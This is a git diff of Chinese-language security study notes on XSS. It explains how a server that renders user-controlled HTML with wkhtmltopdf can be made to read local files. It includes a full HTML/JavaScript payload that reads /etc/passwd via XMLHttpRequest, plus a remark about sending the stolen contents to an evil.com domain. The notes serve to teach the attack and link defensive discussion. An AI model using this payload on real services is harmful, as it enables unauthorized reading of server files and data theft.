@@ -412,21 +412,34 @@ XSS proxy - 与XSS受害者的浏览器实时交互.  工具 [JShell](https://gi
 
 #### XSS利用方式 - 读取本地文件
 
-* 利用条件:web后端使用了"没做好跨域防御"的html解析库(如html解析库[wkhtmltopdf](https://github.com/wkhtmltopdf/wkhtmltopdf))；并且该html解析库的输入(html代码)用户可控
+* 利用条件(漏洞根源)
+  * 条件1 web后端使用了"同源策略不够严格"的html解析库
+  * 条件2 该html解析库的输入(html代码)用户可控
+* 实际案例 - "转换html到pdf文件"案例 已满足利用条件
+  * 满足条件1 已知html解析库[wkhtmltopdf](https://github.com/wkhtmltopdf/wkhtmltopdf)存在漏洞 见[the same-origin policy vulnerability · Issue #4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536)
+  * 满足条件2 该html解析库的输入(html代码)用户可控 见[Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
 * 利用过程:
-  * 构造1.html文件(包含如下JavaScript代码)
+  * 构造1.html文件(代码如下)
   * 把1.html作为输入 使html解析库解析该html文件`file:///tmp/1.html`
-  * 解析html文档必然有解析JavaScript过程:
+  * web后端将html转换为pdf 使用了wkhtmltopdf库来解析html文档(含JavaScript) 解析JavaScript过程:
     * 创建`XMLHTTPRequest`对象
     * 使用该对象`.open`函数 初始化一个新的request(默认异步)
     * 再使用该对象的`.send`函数 发送该request去读取`file://`域下的另一文件`file:///etc/passwd`
     * 因为该解析库没做好跨域防御 所以该request的响应内容就是文件`/etc/passwd`的内容
     * 使用`document.write`将该request的响应内容(文件内容)写入`document`
-  * 真实案例 [Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) 
+  * 结果回显:
+    * 方式1 拿到转换后的文件(result.pdf)
+    * 方式2 使用JavaScript构造跨域请求 发送携带"敏感信息"的http请求 到接受信息的evil.com域
 
-
+Create an HTML file named `1.html`. The file contents are as follows.
 ```
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<body>
+
 <script>
+//document.write(window.location.href);// is file:///tmp/1.html
 x=new XMLHttpRequest;
 x.onload=function(){
 document.write(this.responseText)
@@ -434,15 +447,21 @@ document.write(this.responseText)
 x.open("GET","file:///etc/passwd");
 x.send();
 </script>
+
+</body></html>
 ```
 
 ```
-补充:现代浏览器中当然做了严格的跨域限制 在`file://`域下无法读取其他文件
-如Chrome (版本 78.0.3904.97)
+补充:现代浏览器中同源策略当然做了严格的跨域限制 即使在`file://`域下 无法读取`file://`域下其他文件
 
+如Chrome (版本78.0.3904.97)
 Access to XMLHttpRequest at 'file:///etc/passwd' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.
-```
 
+如Firefox 版本70.0.1
+已拦截跨源请求：同源策略禁止读取位于 file:///etc/passwd 的远程资源。（原因：CORS 请求不是 http）。
+CORS 请求只能使用 HTTPS URL 方案，但请求指定的 URL 可能是不同类型。这种情况经常发生在 URL 指定本地文件，例如使用了 file:/// 的 URL。
+详情https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp
+```
 
 ### SDL - 防御与修复方案
 
